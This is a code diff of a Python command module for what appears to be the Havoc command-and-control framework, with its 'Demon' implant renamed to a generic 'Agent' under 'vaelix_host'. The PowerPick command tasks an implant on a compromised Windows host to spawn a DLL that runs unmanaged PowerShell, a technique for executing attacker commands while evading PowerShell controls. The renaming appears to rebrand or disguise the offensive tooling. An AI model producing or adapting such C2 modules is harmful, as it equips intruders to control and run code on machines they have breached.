@@ -1,25 +1,25 @@
 
-from havoc import Demon, RegisterCommand
+from vaelix_host import Agent, RegisterCommand
 
-def PowerPick(demonID, *param):
+def PowerPick(agentID, *param):
     TaskID   : str    = None
-    demon    : Demon  = None
+    agent    : Agent  = None
     packer   = Packer()
 
-    demon  = Demon( demonID )
+    agent  = Agent( agentID )
 
-    if demon.ProcessArch == 'x86':
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
+    if agent.ProcessArch == 'x86':
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "x86 is not supported" )
         return False
 
     if len( param ) < 1:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough arguments" )
         return
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute unmanaged powershell commands" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, "Tasked agent to execute unmanaged powershell commands" )
 
     packer.addstr( " " + ''.join( param ) )
-    demon.DllSpawn( TaskID, "bin/PowerPick.x64.dll", packer.getbuffer() )
+    agent.DllSpawn( TaskID, "bin/PowerPick.x64.dll", packer.getbuffer() )
 
     return TaskID
 
